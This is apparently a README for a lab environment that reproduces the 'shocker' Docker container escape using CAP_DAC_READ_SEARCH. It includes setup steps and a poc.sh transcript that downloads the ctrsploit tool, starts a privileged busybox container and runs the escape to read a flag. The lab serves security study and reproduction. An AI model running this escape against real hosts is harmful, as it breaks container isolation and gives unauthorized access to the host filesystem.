# shocker (docker v26.1.4)

| Type | Image | Notes |
| ---- | ----- | ----- |
| dqd | ghcr.io/ctrsploit/shocker-v26.1.4:latest | points to `v0.1.0` |
| dqd | ghcr.io/ctrsploit/shocker-v26.1.4:v0.1.0 | migrate from docker_archive |
| dqd | ssst0n3/docker_archive:shocker_docker-v26.1.4_v0.1.0 | - |
| ctr | ghcr.io/ctrsploit/shocker-v26.1.4:ctr_v0.1.0 | - |
| ctr | ssst0n3/docker_archive:ctr_shocker_docker-v26.1.4_v0.1.0 | - |

## usage

### Start and connect

```shell
$ dqd up vul/shocker/v26.1.4
$ ssh dqd-shocker-v26.1.4
```

Fallback without dqd CLI or SSH config:

```shell
$ cd vul/shocker/v26.1.4
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

### reproduce

There's no shocker vulnerability in docker v26.1.4, but we can use shocker as an exploit technique when using `--cap-add CAP_DAC_READ_SEARCH`.

```shell
root@shocker-v26-1-4:~# ./poc.sh
+ wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O ctrsploit
+ chmod +x ctrsploit
+ docker run -tid --name poc --cap-add CAP_DAC_READ_SEARCH busybox
Unable to find image 'busybox:latest' locally
latest: Pulling from library/busybox
b05093807bb0: Pull complete
Digest: sha256:fd8d9aa63ba2f0982b5304e1ee8d3b90a210bc1ffb5314d980eb6962f1a9715d
Status: Downloaded newer image for busybox:latest
0d4d46c549f79e0cfa0fc52a52a45b2aeadda776b6617297a7079a36c99c854c
+ docker cp ctrsploit poc:/usr/bin/
+ docker attach poc
root@shocker-v26-1-4:~# docker attach poc
/ # ctrsploit checksec shocker
[Y]  shocker	# escape by CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014
/ # ctrsploit exploit shocker
/ # cat flag
flag{escaped}
```

### versions

```shell
root@shocker-v26-1-4:~# docker version
Client: Docker Engine - Community
 Version:           26.1.4
Server: Docker Engine - Community
 Engine:
  Version:          26.1.4
 containerd:
  Version:          1.6.33
 runc:
  Version:          1.1.12
root@shocker-v26-1-4:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
VERSION_ID="22.04"
VERSION_CODENAME=jammy
root@shocker-v26-1-4:~# uname -a
Linux shocker-v26-1-4 5.15.0-181-generic #191-Ubuntu SMP Fri May 22 19:09:02 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

## build

```shell
make all ENV=vul/shocker/v26.1.4
```

for developers:

```dockerfile
FROM ghcr.io/ctrsploit/shocker-v26.1.4:ctr_v0.1.0
```
